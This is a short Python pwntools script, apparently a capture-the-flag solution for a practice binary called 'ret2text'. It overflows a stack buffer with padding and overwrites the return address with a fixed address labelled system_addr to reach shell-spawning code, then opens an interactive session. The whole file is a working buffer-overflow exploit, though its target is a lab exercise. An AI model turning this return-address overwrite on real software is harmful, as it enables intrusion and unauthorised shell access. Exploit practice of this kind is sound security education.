#! /usr/bin/python3

from pwn import *

system_addr = 0x0804863a
offset = 0x6c + 4

sh = process("./ret2text")
sh.sendline(b'A' * offset + p32(system_addr))
sh.interactive()

